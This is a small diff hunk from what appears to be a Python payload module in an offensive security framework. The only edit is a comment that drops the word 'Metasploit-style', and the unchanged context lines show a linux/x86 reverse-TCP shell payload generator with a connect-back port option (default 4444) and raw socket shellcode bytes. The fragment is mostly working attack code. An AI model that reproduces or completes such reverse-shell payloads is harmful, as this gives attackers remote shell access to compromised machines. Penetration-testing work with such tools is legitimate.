@@ -20,7 +20,7 @@ class Module(Payload):
 	lport = OptPort(4444, "Connect-back port", True)
 
 	def generate(self):
-		# Metasploit-style linux/x86/shell_reverse_tcp (socketcall)
+		# linux/x86 shell_reverse_tcp (socketcall)
 		# sockaddr: push IP; push family|port
 		sc = bytearray()
 		sc += b"\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80"  # socket
